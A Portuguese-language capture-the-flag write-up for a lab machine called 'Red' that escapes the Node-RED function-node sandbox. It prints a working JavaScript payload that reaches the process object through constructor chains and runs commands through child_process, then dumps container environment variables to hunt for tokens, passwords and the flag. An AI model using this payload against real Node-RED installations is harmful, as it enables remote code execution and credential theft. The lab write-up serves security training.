# Red

![Red](/images/hackingclub-red/file-red-2026-1.png)

## Node-Red

Como ponto de partida, foi criado um `nó de injeção`, responsável por iniciar a execução do fluxo. Em seguida, ele foi conectado a um nó de `função` , onde a lógica JavaScript é executada dentro do ambiente de `sandbox`. Finalmente, um `nó de depuração` foi adicionado para inspecionar o resultado final da execução e observar o comportamento do fluxo. Após isso, foi possível explorar uma vulnerabilidade crítica no nó de função do `Node-RED` que permite a `execução de código arbitrário` no sistema hospedeiro.

![Curl](/images/hackingclub-red/file-red-2026-3.png)
![Host](/images/hackingclub-red/file-red-2026-4.png)

Uma vez que a requisição consegue se comunicar com o host local, abre-se a possibilidade de execução de comandos arbitrários, caracterizando um `sandbox escape` e permitindo acesso direto ao sistema hospedeiro.

**Payload**

```bash
const ctx = node.constructor.constructor('return this')();
const proc = ctx.Buffer.constructor.constructor('return process')();
const child_process = proc.mainModule.require('child_process');
const result = child_process.execSync('whoami').toString();
msg.payload = {
    status: "RCE Successful",
    output: result.trim(),
    platform: proc.platform,
    arch: proc.arch
};
return msg;
```

![RCE](/images/hackingclub-red/file-red-2026-5.png)
![RCE Confirmed](/images/hackingclub-red/file-red-2026-6.png)

Com o acesso ao host alvo, foi realizada uma verificação inicial do ambiente comprometido. A partir da shell obtida, identificamos que o contexto em que estávamos era um container `Docker`, e não o sistema operacional principal.

Diante disso, iniciamos o processo de enumeração do ambiente. Para coletar informações relevantes e identificar possíveis dados sensíveis — como credenciais, caminhos internos ou a própria flag — executamos o comando `env`, com o objetivo de listar as variáveis de ambiente disponíveis no container.

Essa etapa é importante porque variáveis de ambiente frequentemente armazenam informações sensíveis utilizadas pela aplicação, como `tokens`, `senhas`, `chaves de API` ou referências a arquivos internos, que podem auxiliar na continuidade da análise.

![Flag](/images/hackingclub-red/file-red-2026-7.png)